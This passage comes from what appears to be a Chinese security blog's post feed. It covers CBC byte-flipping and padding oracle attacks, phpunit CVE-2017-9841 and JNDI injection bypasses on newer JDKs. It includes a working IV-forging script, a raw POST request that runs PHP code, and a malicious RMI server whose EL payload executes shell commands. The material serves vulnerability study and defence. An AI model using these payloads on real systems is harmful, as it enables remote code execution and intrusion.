在计算机中，存储的数据是以二进制的格式存入的，把两段二进制数字进行异或运算的话，相同的得0，不同的得1。字符在计算机中有对应的ASCII码值，对字符进行异或运算就是将两串字符对应的ASCII码值进行异或。 异或运算具有可逆性，a xor b = c 等价于 b xor c = a 等价于 a xor c = b。 CBC模式CBC（Cipher Block Chaining）即密码分组链接，是一种加密模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。 加密流程CBC模式加密流程如图： Plaintext：明文数据； Initialzation Vector（IV）：初始向量； Key：分组加密使用的密钥； Ciphertext：密文数据； 加密步骤： 首先将明文分成长度相同（一般为8或16字节）的n组，其中最后一组位数不足的进行Padding操作（填充规则是PKCS #5或PKCS #7）； 生成一个随机的初始向量（IV）和一个密钥（Key）； 将IV与第一组明文进行XOR，将XOR后的结果使用Key进行加密得到第一组密文； 将第一组密文和第二组明文进行XOR，将XOR后的结果使用Key进行加密得到第二组密文； 依次类推，将第n-1组密文和第n组明文进行XOR，将XOR后的结果使用Key进行加密得到第n组密文； 将IV和得到的所有分组密文拼接到一起，得到最终的密文； 解密流程CBC模式解密流程如图： 解密步骤： 首先从密文中提取出初始向量（IV），然后将密文分成n组（一般为8或16字节一组）； 使用密钥（Key）对第一组密文进行解密，得到解密的中间值我们称为Intermediary Value； 使用IV与第一组Intermediary Value进行XOR，得到第一组明文； 使用Key对第n组密文进行解密，得到第n组Intermediary Value； 使用第n-1组密文与第n组Intermediary Value进行XOR，得到第n组明文； 将所有分组明文拼接到一起，得到最终的明文； 由此可得以下结论： 对于第一组密文的解密：Plaintext[1] = Decrypt(Ciphertext[1]) XOR IV 对于第n组密文的解密（n&gt;1）：Plaintext[n] = Decrypt(Ciphertext[n]) XOR Ciphertext[n-1] PKCS #5/PKCS #7填充模式The Public-Key Cryptography Standards (PKCS)是由美国RSA数据安全公司及其合作伙伴制定的一组公钥密码学标准，其中包括证书申请、证书更新、证书作废表发布、扩展证书内容以及数字签名、数字信封的格式等方面的一系列相关协议。 PKCS #5是8字节填充的，即填充一定数量的内容，使得成为8的整数倍，而填充的内容取决于需要填充的数目。例如，0x56在经过PKCS #5填充之后会成为0x56 0x07 0x07 0x07 0x07 0x07 0x07 0x07因为需要填充7字节，因此填充的内容就是7。当然特殊情况下，如果已经满足了8的整倍数，按照PKCS #5的规则，仍然需要在尾部填充8个字节，并且内容是0x08,目的是为了加解密时统一处理填充。 PKCS #7与PKCS #5的区别在于PKCS5只填充到8字节，而PKCS #7可以在1-255之间任意填充。 具体可参考：填充模式：PKCS#5/PKCS7 DES算法进行加密时的填充规则是PKCS #5、填充最多8位，而AES算法进行加密时的填充规则是PKCS #7、填充最多16位。 举例看下PKCS #5的填充规则，其最多填充8位，填充字节的取值范围是0x01到0x08。以下图为例： 第一行最后还差5个字符，则在最后填充5个0x05，后面类比。需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组。 16字节的AES采用的是PKCS #7，填充的规则和PKCS #5是一样的，只是分组长度不一样，也就是说填充字节的取值范围是0x00到0x10。 Padding OraclePadding在这里的含义是“填充”，因为对于加密算法来说，它们是基于等长的“数据块”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充”才能形成完整的“块”。“填充”时比较常用的是PKCS #5规则，简单地说，便是根据最后一个数据块所缺少的长度来选择填充的内容。 在解密时，如果算法发现解密后得到的结果，它的填充方式不符合规则，那么表示输入数据有问题，对于解密的类库来说，往往便会抛出一个异常，提示Padding不正确。Oracle在这里便是“提示”的意思，和甲骨文公司没有任何关系。 简单地说，Padding Oracle就是提示输入数据的填充方式不符合规则的意思。 0x02 CBC字节翻转攻击基本原理在前面CBC模式的解密流程中知道，Ciphertext[n-1]（即第n-1组密文）用于与Decrypt(Ciphertext[n])即（使用Key对第n组密文解密后的结果）进行XOR生成下一组的明文Plaintext[n]，而这个点正是CBC字节翻转攻击的漏洞点——如果攻击者修改了Ciphertext[n-1]的某个字节，然后提交到服务端与Decrypt(Ciphertext[n])进行XOR运算，此时就会得到一个不同的明文。因此，攻击者可以在不知道密钥的情况下，通过篡改初始向量或密文的方式来控制明文进而实现绕过某些服务端过滤机制等。 原理如下图： 由前面知道，解密获取第n组密文为： 1Plaintext[n] = Decrypt(Ciphertext[n]) XOR Ciphertext[n-1] 由XOR可逆性可得解密的中间值为明文和上一组密文的XOR结果，这里另起名字简称为IntermediaryValue： 1IntermediaryValue[n] = Decrypt(Ciphertext[n]) = Plaintext[n] XOR Ciphertext[n-1] 攻击者想得到自己构造的恶意明文，是通过IntermediaryValue和自己构造的恶意上一组密文XOR实现的： 1Evil_Plaintext[n] = IntermediaryValue[n] XOR Evil_Ciphertext[n-1] 由XOR可逆性可得： 1Evil_Ciphertext[n-1] = IntermediaryValue[n] XOR Evil_Plaintext[n] 进而： 1Evil_Ciphertext[n-1] = Plaintext[n] XOR Ciphertext[n-1] XOR Evil_Plaintext[n] 因此可得结论：在CBC字节翻转攻击中，攻击者传入的恶意IV或恶意上一组密文是根据原始明文、原始上一组密文、想得到的恶意明文三者进行异或运算得到的。 Demo参考网上改的Demo，已知原始明文Plaintext和原始初始向量IV，再结合想得到的恶意明文字符来通过构造恶意IV来实现攻击（这里只修改第一个分组，暂不考虑其他多个分组的情况）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import osimport codecsfrom Crypto.Cipher import AESfrom Crypto import Randomdef padding(plaintext): count = len(plaintext) add = length - (count % length) plaintext_padding = plaintext + (chr(add) * add) return plaintext_padding# 16字节密钥KeySECRET_KEY = codecs.encode(os.urandom(8), 'hex_codec').upper()# 16字节初始向量IVIV = Random.new().read(16)# 使用AES算法，该算法以16字节为处理单位aes = AES.new(SECRET_KEY, AES.MODE_CBC, IV)length = 16# 原明文plaintext = \"milktea\"# 填充原明文plaintext_padding = padding(plaintext)# 使用AES加密填充后的原明文cipher = aes.encrypt(plaintext_padding.encode())print(\"[*]填充后的明文：\", plaintext_padding)print(\"[*]密钥Key：\", SECRET_KEY)print(\"[*]初始向量IV：\", IV)print(\"[*]填充后的明文序列：\", list(plaintext_padding))print(\"[*]密文：\", aes.encrypt(plaintext_padding.encode()))old_IVList = []plaintextList = []for i in range(0, len(codecs.encode(IV, 'hex_codec').decode()), 2): old_IVList.append(int(codecs.encode(IV, 'hex_codec').decode()[i:i + 2], 16))for i in list(plaintext_padding): plaintextList.append(ord(i))evil_IVList = old_IVList# 修改制定字符evil_IVList[4] = plaintextList[4] ^ old_IVList[4] ^ ord('7')evil_IVList[2] = plaintextList[2] ^ old_IVList[2] ^ ord('1')# 在末尾添加.comevil_IVList[7] = plaintextList[7] ^ old_IVList[7] ^ ord('.')evil_IVList[8] = plaintextList[8] ^ old_IVList[8] ^ ord('c')evil_IVList[9] = plaintextList[9] ^ old_IVList[9] ^ ord('o')evil_IVList[10] = plaintextList[10] ^ old_IVList[10] ^ ord('m')evil_IV = ''for i in evil_IVList: # 为了保证构造出来的IV是16字节，1位的16进制补0变成2位 if len(hex(i)[2:]) == 1: evil_IV += '0' + hex(i)[2:] else: evil_IV += hex(i)[2:]# 恶意构造的16字节IVevil_IV = codecs.decode(evil_IV, 'hex_codec')print(\"[*]恶意构造出的IV：\", evil_IV)# 使用恶意IV进行AES解密来获取新的明文aes = AES.new(SECRET_KEY, AES.MODE_CBC, evil_IV)dsc = aes.decrypt(cipher).decode()print(\"[*]利用恶意构造的IV解密得到的明文：\", dsc)# 假设服务端判断解密得到的明文满足某个条件就会进行其他恶意操作if \"mi1k7ea.com\" in dsc: print(\"[+]CBC Byte Flipping Attack!\") 运行结果： 多个分组的场景可以参考这篇文章的代码示例：CBC字节翻转攻击测试 0x03 Padding Oracle Attack本部分只写针对CBC模式的Padding Oracle Attack，针对ASP .NET的场景这里暂未研究。 前提条件Padding Oracle Attack的场景需要如下条件： 攻击者知道服务端使用CBC模式的加密算法，且能获取到密文Ciphertext以及附带在密文前面的初始向量IV； 攻击者能向服务端提交数据触发解密操作，并能根据服务端返回的响应来判断是否能进行正常解密； 基本原理Padding Oracle Attack是根据CBC字节翻转攻击、Padding规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击，是针对CBC链接模式的攻击，而不是针对某个加密算法的攻击。 CBC字节翻转攻击和Padding Oracle在前面已经说过了，这里重点说下是如何根据服务端解密后返回的不同状态来穷举中间值进而获取明文的。 由Padding Oracle可知，如果输入的密文不合法（填充规则不对），类库则会抛出异常，这便是一种提示。通过CBC字节翻转攻击，攻击者可以不断地提供密文，让解密程序给出提示，不断修正，最终得到所需要的结果。关键就在于解密程序给出对于不同密文的解密结果有不同的提示。一般的，服务器对于接受的使用CBC模式加密敏感信息进行解密操作时，先是检测密文最后一组的填充值是否正确来确定能否正常解密（即检测是否符合PKCS #5/7），如果错误就直接返回错误，如果正确则进一步判断解密的内容是否正确，因此分如下三种情况： 密文不能正常解密； 密文可正常解密但解密结果不对； 密文可正常解密且解密结果正确； 这里第一种情况和第二三种的情况肯定是不一样的，很多服务器对于第一种情况都是返回500、对于第二三种情况则是返回200，这就是个有限的二元组，攻击者可以根据这个响应状态码来判断是否解密成功，给攻击者进行猜解攻击的可能。更细节点，就是让攻击者可以通过服务端解密后的响应状态来判断填充的字节是否正确来进行穷举攻击，攻击者只需要根据第一和第二种情况返回的不同状态就能实现穷举攻击，而无需服务端能解密得到正确的结果。 由前面CBC模式的解密流程知道，第n组密文解密后的中间值与前一组的密文XOR便可得到明文（Plaintext[n] = IntermediaryValue[n] XOR Ciphertext[n-1]）。其中，密文解密部分是在服务器端进行的，我们无需考虑，因此关键在于得到正确的中间值。在Padding Oracle Attack中，攻击者可控的参数是IV和Ciphertext，通过对IV的穷举来请求服务器端对指定的Ciphertext进行解密，并对返回的结果进行判断，从而得到正确的中间值，进而通过XOR得到原始明文。 网上找的一个图如下，使用的是DES算法，明文填充了4位，如果最后一组密文解密后的结果（Intermediary Value）与前一组密文/初始向量（IV）异或得到的最后四位是0x04，那么服务器就会返回可以正常解密： 简单地说，就是利用PKCS规则来构造Padding、通过服务端解密后返回的不同状态来推出正确的中间值，再通过中间值与原密文XOR得到原明文，之后依次递归解出每一位的中间值和明文直至全部穷举成功。 攻击过程攻击过程如下： 1、假设攻击者拥有密文且得知服务端是用CBC模式的DES算法进行加解密操作，然后把密文按照加密算法的要求分好组，再对倒数第二组密文进行构造； 2、先假设明文只填充了一字节，对倒数第二组密文的最后一字节从0x00到0xff逐个赋值后提交给服务器进行解密操作，直至服务器返回的响应状态码表示构造后的密文可以正常解密为止； 比如构造的倒数第二组密文（或IV）最后一字节为0x00时，在服务端解密后得到0x3D、这是无法正常解密的、会返回500响应状态码： 当构造的倒数第二组密文（或IV）最后一字节为0x66时，在服务端解密后得到0x01、这是正确的padding值，是能正常解密的，此时会返回200响应状态码： 3、利用XOR的可逆性，攻击者把前面构造的倒数第二组密文的最后一字节0x66和0x01进行XOR得到中间值Intermediary Value（后续简称M1）为0x67； 4、接着，假设明文填充了两字节，即明文最后两字节是0x02，再构造倒数第二组密文，把M1与0x02进行XOR得到填充两字节时密文的最后一位的值为0x65。此时，攻击者只需要对倒数第二位进行不断地赋值尝试（0x00-0xff），当服务器返回值表示可以正常解密时（如200响应状态码），就将此时的倒数第二位密文的取值与0x02进行XOR得到最后一组密文倒数第二字节对应的中间值即M2； 5、接着，再构造出倒数第三、四直至得到最后一组密文的中间值，把这个中间值与倒数第二组的原始密文进行XOR便可得到最后一组分组的明文； 6、舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的明文，依次下去直至得到全部的明文； 工具整个攻击过程相对来说是复杂了些，但是业界已经有工具来实现这个复杂过程的攻击利用： https://github.com/AonCyberLabs/PadBuster 在Kali中也是有该命令的，需要安装：apt-get install padbuster DemoPentesterLab中有个Padding Oracle靶机环境，整个攻击利用过程是借助padbuster来实现，比较简单。 具体做法可参考：PentesterLab 的 Padding Oracle 漏洞靶机测试 0x04 参考CBC Byte Flipping Attack—101 Approach Padding oracle attack详细解析 CBC字节翻转攻击和Padding Oracle","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Padding Oracle Attack","slug":"Padding-Oracle-Attack","permalink":"https://www.mi1k7ea.com/tags/Padding-Oracle-Attack/"},{"name":"CBC字节翻转攻击","slug":"CBC字节翻转攻击","permalink":"https://www.mi1k7ea.com/tags/CBC字节翻转攻击/"}]},{"title":"浅析phpunit之CVE-2017-9841","date":"2020-09-15T03:26:23.000Z","path":"2020/09/15/浅析phpunit之CVE-2017-9841/","text":"0x01 简介最近hw遇到phpunit的攻击流量，之前没分析过，这里简单看下。 Composer 是 PHP 用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。Composer 默认情况下不是全局安装，而是基于指定的项目的某个目录中（例如 vendor）进行安装，并将所有文件放在该目录中。 PHPUnit是一个轻量级的PHP测试框架。使用Composer来安装PHPUnit扩展时，PHPUnit的所有文件都会存在于vendor目录中。 0x02 CVE-2017-9841靶机环境靶机环境参考Vulhub：https://vulhub.org/#/environments/phpunit/CVE-2017-9841/ 影响版本phpunit漏洞版本如下： 4.8.19-4.8.27 5.0.10-5.6.2 漏洞原理如果通过Composer安装的phpunit扩展的版本是漏洞版本，且vendor目录放在外部能访问的Web目录中，就存在phpunit远程代码执行漏洞。 漏洞代码，phpunit/src/Util/PHP/eval-stdin.php： 123&lt;?phpeval('?&gt;' . file_get_contents('php://input')); 漏洞复现直接往eval-stdin.php文件所在路径直接POST发送PHP代码即可： 123456789101112131415POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1Host: your-ipCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9If-None-Match: &quot;903-591a03aa15600&quot;If-Modified-Since: Tue, 03 Sep 2019 06:30:48 GMTConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 18&lt;?php phpinfo();?&gt; 补丁分析5.6.3版本的eval-stdin.php： 123&lt;?phpeval('?&gt;' . file_get_contents('php://stdin')); 就是将php://input伪协议替换为php://stdin伪协议。 这样当然能修补漏洞了。但是听说php://stdin伪协议在某些PHP SAPI场景下还是有问题的，这个可自行探究。 防御方法不将vendor放在Web目录中。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"浅析高低版JDK下的JNDI注入及绕过","date":"2020-09-07T02:13:11.000Z","path":"2020/09/07/浅析高低版JDK下的JNDI注入及绕过/","text":"0x00 前言本篇主要是填前面的坑，是《浅析JNDI注入》的延续篇，主要调试分析高低版本JDK下JNDI注入的RMI和LDAP两个攻击向量的调用过程及其异同点，再复现调试网上公布的高版本JDK绕过方法。 0x01 调试分析高低版JDK下的JNDI注入这里只对常用的RMI和LDAP两个攻击向量进行调试分析。 RMI低版本以之前lookup参数注入的Demo来调试分析下，将RMI服务端的factoryLocation参数改为http://127.0.0.1:8000/，本地JDK为8u112。 直接在com.sun.jndi.rmi.registry.RegistryContext类的lookup()函数下打上断点，此时函数调用栈如下： 1234lookup:124, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:13, AClient 其中从RMI注册表中lookup查询到服务端中目标类的Reference后返回一个ReferenceWrapper_Stub类实例，该类实例就是客户端的存根、用于实现和服务端进行交互，最后调用decodeObject()函数来解析： 跟进decodeObject()函数中，先判断入参ReferenceWrapper_Stub类实例是否是RemoteReference接口实现类实例，而ReferenceWrapper_Stub类正是实现RemoteReference接口类的，因此通过判断调用getReference()来获取到ReferenceWrapper_Stub类实例中的Reference即我们在恶意RMI注册中绑定的恶意Reference；再往下调用NamingManager.getObjectInstance()来获取远程服务端上的类实例： 跟进，调用到getObjectFactoryFromReference()函数，尝试从Reference中获取ObjectFactory： 跟进，通过codebase和factoryName来调用loadClass()函数来远程加载恶意类EvilClassFactory，最后直接通过newInstance()实例化该远程恶意类并返回： 注意，这里返回新建的远程类实例之前会先对实例转换为ObjectFactory类，因此，如果远程类不实现ObjectFactory接口类的话就会在此处报错，之前一些demo的恶意类没实现ObjectFactory类所出现的报错正出于此。 执行完newInstance()之后就触发漏洞了： 再往下就是判断新建的远程类实例是否为null，不为null则调用该远程类的getObjectInstance()函数并返回，否则直接返回Reference实例。从这里知道，其实恶意类的恶意代码除了能写在无参构造函数外，也可以写在重写的getObjectInstance()函数中来触发。 至此，整个调用过程调试完毕。 高版本在JDK 6u141、7u131、8u121之后，增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。 这里更换8u251版本的JDK来继续调试。 直接运行会报如下错误，说该ObjectFactory是不可信的，除非设置com.sun.jndi.rmi.object.trustURLCodebase项的值为true： 1234567[*]Using lookup() to fetch object with rmi://127.0.0.1:1688/expException in thread \"main\" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'. at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) at javax.naming.InitialContext.lookup(InitialContext.java:417) at AClient.main(AClient.java:13) 前面的调用过程是一样的，这里直接根据报错在com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数打断点调试就好，此时函数调用栈： 12345decodeObject:495, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:13, AClient 看到，在调用NamingManager.getObjectInstance()函数获取Reference指定的远程类之前先进行com.sun.jndi.rmi.object.trustURLCodebase值的判断，该值默认为false因此直接抛出错误： 修补点源码对比对比下新旧版JDK的com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数的代码就很清楚了： 12345678910111213141516171819202122232425262728293031323334353637383940414243// 低版本JDK private Object decodeObject(Remote var1, Name var2) throws NamingException &#123; try &#123; Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; return NamingManager.getObjectInstance(var3, var2, this, this.environment); &#125; catch (NamingException var5) &#123; throw var5; &#125; catch (RemoteException var6) &#123; throw (NamingException)wrapRemoteException(var6).fillInStackTrace(); &#125; catch (Exception var7) &#123; NamingException var4 = new NamingException(); var4.setRootCause(var7); throw var4; &#125; &#125;// 高版本JDK private Object decodeObject(Remote var1, Name var2) throws NamingException &#123; try &#123; Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; Reference var8 = null; if (var3 instanceof Reference) &#123; var8 = (Reference)var3; &#125; else if (var3 instanceof Referenceable) &#123; var8 = ((Referenceable)((Referenceable)var3)).getReference(); &#125; if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) &#123; throw new ConfigurationException(\"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.\"); &#125; else &#123; return NamingManager.getObjectInstance(var3, var2, this, this.environment); &#125; &#125; catch (NamingException var5) &#123; throw var5; &#125; catch (RemoteException var6) &#123; throw (NamingException)wrapRemoteException(var6).fillInStackTrace(); &#125; catch (Exception var7) &#123; NamingException var4 = new NamingException(); var4.setRootCause(var7); throw var4; &#125; &#125; 很明显，就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false。 LDAP低版本以之前LDAP+Reference的Demo来调试分析下，本地JDK为8u181。 先看下，我们在恶意LDAP服务端的sendResult()函数中设置了如下属性项： 1234e.addAttribute(\"javaClassName\", \"Exploit\");e.addAttribute(\"javaCodeBase\", cbstring);e.addAttribute(\"objectClass\", \"javaNamingReference\");e.addAttribute(\"javaFactory\", this.codebase.getRef()); 直接在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数上打上断点，此时函数调用栈如下，看到就是不同几个类的lookup()函数在逐次调用： 1234567c_lookup:1051, LdapCtx (com.sun.jndi.ldap)p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:417, InitialContext (javax.naming)main:9, LdapClient 往下调试看到，var4变量是BasicAttributes类实例、其值是我们在恶意LDAP服务端设置的属性值，因为设置了javaClassName属性值为”Exploit”，因此调用了decodeObject()函数来对var4进行对象解码操作： 跟进decodeObject()函数中，先调用getCodebases()函数获取到javaCodeBase项设置的URL地址http://127.0.0.1:8000/，接着两个判断是否存在javaSerializedData和javaRemoteLocation这两项的值，这里由于没设置就直接进入最后的else语句逻辑，最后由于var1不为null且var1值为前面设置的objectClass内容因此直接调用到decodeReference()函数来进一步解码Reference： 在decodeReference()函数中，根据设置的javaFactory、javaClassName、javaCodeBase等项来通过执行Reference(&quot;EvilObject&quot;, null, &quot;http://127.0.0.1:8000/&quot;)来新建一个Reference类实例，最后直接返回该Reference类实例： decodeObject()函数执行完返回Reference类实例后，继续在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数往下调试，看到最后是调用到了DirectoryManager.getObjectInstance()函数： 跟进去getObjectInstance()函数的调用，看到其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory后再调用getObjectInstance()函数来获取实际的对象实例： 跟进getObjectFactoryFromReference()函数中，其中通过factoryName和codebase来调用loadClass()函数从http://127.0.0.1:8000/EviObject中远程加载类（在loadClass()函数中实际是通过FactoryURLClassLoader加载器来加载远程Factory URL类）： 获取到远程恶意类EvilObject后，直接调用newInstance()函数新建该恶意类实例： 而此时由于EvilObject类的恶意代码是写在无参构造函数中的，因此即使无法成功获取到Object实例也能直接触发漏洞： 注意：上述报错的原因在于恶意远程类没有实现ObjectFactory接口类，具体原因后面会调试分析到。当然，实现了该接口就不会出现这种报错了。 高版本JDK 6u211、7u201、8u191之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项。 这里更换8u251版本的JDK来继续调试。 前面的函数调用过程和低版本是一样的，直接看下不同的地方，就是在getObjectFactoryFromReference()函数中调用loadClass()函数时返回了null，直接在com.sun.naming.internal.VersionHelper12类loadClass()函数上打断点调试，此时函数调用栈如下： 12345678910loadClass:101, VersionHelper12 (com.sun.naming.internal)getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)getObjectInstance:189, DirectoryManager (javax.naming.spi)c_lookup:1085, LdapCtx (com.sun.jndi.ldap)p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:417, InitialContext (javax.naming)main:9, LdapClient 看到这里添加了个if判断条件，检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，是的话才能正常通过URLClassLoader来加载远程类，否则返回null： 看到常量trustURLCodebase定义处的源码（位于com.sun.naming.internal.VersionHelper12），可以看到该值是从系统设置找那个获取的，默认为FALSE： 123456789101112131415161718/** * Determines whether classes may be loaded from an arbitrary URL code base. */private static final String TRUST_URL_CODEBASE_PROPERTY = \"com.sun.jndi.ldap.object.trustURLCodebase\";private static final String trustURLCodebase = AccessController.doPrivileged( new PrivilegedAction&lt;String&gt;() &#123; public String run() &#123; try &#123; return System.getProperty(TRUST_URL_CODEBASE_PROPERTY, \"false\"); &#125; catch (SecurityException e) &#123; return \"false\"; &#125; &#125; &#125; ); 由于loadClass()函数返回的是null，因此getObjectFactoryFromReference()函数同样返回null： getObjectFactoryFromReference()函数返回的null跳过了中间两个getObjectInstance()函数调用而直接返回refInfo： 再往后也是返回该Reference类实例直至执行完流程。 修补点源码对比现在比较下新旧版本的com.sun.naming.internal.VersionHelper12类loadClass()函数： 123456789101112131415161718192021222324252627282930313233// 旧版本JDK /** * @param className A non-null fully qualified class name. * @param codebase A non-null, space-separated list of URL strings. */ public Class&lt;?&gt; loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException &#123; ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl); &#125;// 新版本JDK /** * @param className A non-null fully qualified class name. * @param codebase A non-null, space-separated list of URL strings. */ public Class&lt;?&gt; loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException &#123; if (\"true\".equalsIgnoreCase(trustURLCodebase)) &#123; ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl); &#125; else &#123; return null; &#125; &#125; 很明显，就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false。 0x02 绕过高版本JDK（8u191+）限制由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 KINGX提到了如下两种绕过方式： 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。 简单地说，在低版本JDK的JNDI注入中，主要利用的就是classFactoryLocation这个参数来实现远程加载类利用的。但是在高版本JDK中对classFactoryLocation这个途径实现了限制，但是对于classFactory这个参数即本地ClassPath中如果存在Gadget的话还是能够进行JNDI注入攻击的。 利用本地恶意Class作为Reference Factory简单地说，就是要服务端本地ClassPath中存在恶意Factory类可被利用来作为Reference Factory进行攻击利用。该恶意Factory类必须实现javax.naming.spi.ObjectFactory接口，实现该接口的getObjectInstance()方法。 大佬找到的是这个org.apache.naming.factory.BeanFactory类，其满足上述条件并存在于Tomcat依赖包中，应用广泛。该类的getObjectInstance()函数中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。 现在来看下RMI攻击向量的代码是如何实现的。 攻击利用具体依赖Tomcat中的jar包为：catalina.jar、el-api.jar、jasper-el.jar。 恶意RMI服务端： 12345678910111213141516171819202122import com.sun.jndi.rmi.registry.ReferenceWrapper;import org.apache.naming.ResourceRef;import javax.naming.StringRefAddr;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class EvilRMIServer &#123; public static void main(String[] args) throws Exception &#123; System.out.println(\"[*]Evil RMI Server is Listening on port: 6666\"); Registry registry = LocateRegistry.createRegistry( 6666); // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null); // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码 ref.add(new StringRefAddr(\"forceString\", \"x=eval\")); // 利用表达式执行命令 ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'touch /tmp/mi1k7ea']).start()\\\")\")); System.out.println(\"[*]Evil command: touch /tmp/mi1k7ea\"); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref); registry.bind(\"Object\", referenceWrapper); &#125;&#125; JNDI客户端： 12345678910import javax.naming.Context;import javax.naming.InitialContext;public class Client &#123; public static void main(String[] args) throws Exception &#123; String uri = \"rmi://localhost:6666/Object\"; Context ctx = new InitialContext(); ctx.lookup(uri); &#125;&#125; 打包成jar，在Linux环境（Java版本为1.8.0_252）下运行该jar包，监听在6666端口： 这里通过-classpath或-cp参数来假设是服务端的含有Tomcat相关jar包的ClassPath环境，运行即可成功执行命令： 几种变体的表达式前面的恶意表达式就是通过反射的方式来实现命令执行的，本地测试有如下几种变体，原理都是基于反射调用任意类方法： 12345678910111213141516import javax.el.ELProcessor;public class Test &#123; public static void main(String[] args) &#123; String poc = \"''.getClass().forName('javax.script.ScriptEngineManager')\" + \".newInstance().getEngineByName('nashorn')\" + \".eval(\\\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\";// String poc = \"''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())\" +// \".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')\" +// \".invoke(null),'calc.exe')&#125;\";// String poc = 